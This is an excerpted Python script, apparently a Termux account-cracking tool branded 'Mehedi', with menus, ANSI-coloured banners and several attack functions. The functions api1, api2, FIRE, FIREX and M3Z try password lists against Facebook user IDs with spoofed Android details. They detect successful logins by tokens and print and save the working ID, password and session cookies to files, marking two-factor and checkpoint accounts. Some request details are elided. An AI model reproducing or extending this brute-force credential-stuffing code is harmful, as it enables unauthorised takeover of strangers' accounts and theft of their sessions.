...
print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mRAKIB-/HASSAN\33[1;91m⊁ ')
...
def arfan1():
        ...
        return ua
#-----------------------------------------------------#
#os.system("xdg-open https://www.facebook.com/profile.php?id=100042848776596&mibextid=rS40aB7S9Ucbxw6v")
...
═════════════════════════════════════════════                   {+} TOOL CREATED BY   : MEHEDI KING
{+} GITHUB NAME       : Mehedi-CYBER-404
{+} TOOL / STATUS     : RANDOM / ACTIVE
{+} TOOL VIRSION      : 1.2
═════════════════════════════════════════════
""")
...
def menu_a():
			...
			print(f"\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;48m JOIN MESSENGER GROUP ")
			print(f'\x1b[1;92m {XX}[\x1b[1;92m0{XX}]\x1b[1;91m EXIT MENU ')
			linex()
			xd=input(f'\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m CHOICE MENU : ')
			if xd in ['1','01']:
				clear()
				print(f'\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m FILE NAME : /sdcard/Mehedi .txt  etc..')
				linex()
			...
			elif xd in ['0','E']:clear();print(f"\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m THANKS FOR USING ")
...
def api2(ids,names,passlist):
        try:
                ...
                sys.stdout.write(f'\r {bMehedi }[{G}Mehedi -M2{bMehedi }]-[{G}%s{bMehedi }]-[{G}OK:%s{bMehedi }]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
                ...
                for pw in passlist:
                        ...
                        if 'session_key' in po:
                                        print(f'\r\r {bMehedi }[{G}LIVE-OK{bMehedi }]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                                        open('/sdcard/Mehedi -FILE-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                        elif twf in str(po):
                                        if 'y' in pcp:
                                                print('\r\r\033[1;36m[Mehedi -2F] '+ids+' | '+pas)
                                                twf.append(ids)
                                                break
                        elif 'www.facebook.com' in po['error_msg']:
                                        if 'y' in pcp:
                                                print('\r\r\033[1;30m[Mehedi -CP] '+ids+' | '+pas+'\033[1;97m')
...
def api1(ids,names,passlist):
        try:
                global ok,loop,sim_id
                sys.stdout.write(f'\r {bMehedi }[{G}Mehedi -M1{bMehedi }]-[{G}%s{bMehedi }]-[{G}OK:%s{bMehedi }]'%(loop,len(oks)));sys.stdout.flush()
                fn = names.split(' ')[0]
                try:
                        ln = names.split(' ')[1]
                except:
...
def RANDOMIN():
    ...
    print(f'\x1b[1;92m {XX}[\x1b[1;92m1{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m2{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mUID LOGIN{XX}]')
    print(f'\x1b[1;92m {XX}[\x1b[1;92m3{XX}]\x1b[38;5;46m Method \x1b[1;92m{XX}[\x1b[1;92mCOOKIE LOGIN{XX}]')
    linex()
    mthdx=input(f'\x1b[1;92m {XX}[\x1b[1;92m●{XX}]\x1b[38;5;46m SELECT METHOD : ')
    for nmbr in range(limit):
...
def FIRE(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mMehedi -M1\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bMehedi }[{G}LIVE-OK{bMehedi }]{G} '+ids+' \033[1;30m|\033[1;32m '+pas+'\033[1;37m')
                print(f'\r\r {bMehedi }[{G}•{bMehedi }]{G} '+kuki+'')
                linex()
                open('/sdcard/Mehedi -RANDOM-M1-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def FIREX(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mMehedi -M2\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bMehedi }[{G}•{bMehedi }]{G} '+kuki+'')
                linex()
                open('/sdcard/Mehedi -RANDOM-M2-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
...
def M3Z(ids,pwv,tl):
    global loop,oks,cps,twf
    cl = random.choice([f'\033[1;91m','\033[1;92m','\033[1;94m','\033[1;95m','\033[1;96m','\033[1;97m','\033[1;90m'])
    sys.stdout.write(f'\r \033[1;90m[\033[1;92mMehedi -M3\033[1;90m]-[{cl}{loop}\033[1;90m]-\033[1;90m[\033[1;92mOK:{len(oks)}\033[1;90m]');sys.stdout.flush()
    try:
        for pas in pwv:
            android_version=str(random.randrange(6,13))
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\r {bMehedi }[{G}•{bMehedi }]{G} '+kuki+'')
                linex()
                open('/sdcard/Mehedi -RANDOM-M3-OK.txt','a').write(str(ids)+' | '+pas+' | '+kuki+'\n')
                oks.append(ids)
                break
            else:continue
        loop+=1
